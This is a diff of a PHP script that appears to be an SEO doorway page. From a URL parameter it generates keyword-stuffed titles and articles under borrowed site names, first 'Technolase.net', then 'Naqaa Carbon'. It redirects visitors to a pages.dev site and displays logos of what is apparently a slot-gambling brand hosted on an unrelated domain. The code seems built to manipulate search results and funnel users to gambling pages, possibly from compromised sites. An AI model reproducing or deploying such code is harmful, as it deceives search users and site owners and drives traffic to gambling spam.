@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x Technolase.net: Mengenal Perkembangan Teknologi di Era Digital";
+    $title = "$BRAND x Naqaa Carbon – Informasi Karbon dan Solusi Berkelanjutan";
 
-    $description = "$BRAND x Technolase.net hadir sebagai bagian dari ekosistem informasi digital yang berkembang seiring meningkatnya penggunaan teknologi dalam kehidupan sehari-hari.";
+    $description = "$BRAND x Naqaa Carbon membahas karbon, lingkungan, keberlanjutan, pengurangan emisi, energi bersih, dan berbagai solusi untuk masa depan yang lebih ramah lingkungan.";
     
-    $artikel = "$BRAND x Technolase.net hadir sebagai bagian dari ekosistem informasi digital yang berkembang seiring meningkatnya penggunaan teknologi dalam kehidupan sehari-hari. Perkembangan internet, perangkat pintar, aplikasi, kecerdasan buatan, serta berbagai inovasi digital telah memberikan perubahan besar terhadap cara masyarakat bekerja, belajar, berkomunikasi, dan memperoleh informasi.";
+    $artikel = "$BRAND x Naqaa Carbon hadir dalam ekosistem digital yang berkaitan dengan karbon, lingkungan, dan perkembangan solusi berkelanjutan. Perubahan iklim dan meningkatnya perhatian terhadap emisi gas rumah kaca membuat isu karbon menjadi semakin penting bagi masyarakat, bisnis, industri, dan berbagai organisasi.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/15/e1/7c/15e17c684dd2661effad2b4d72c85c44.jpg";
+    $image = "https://i.pinimg.com/1200x/c6/f1/31/c6f1319336ef63f53bcae4e3050383cb.jpg";
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://technolase.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://naqaacarbon.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
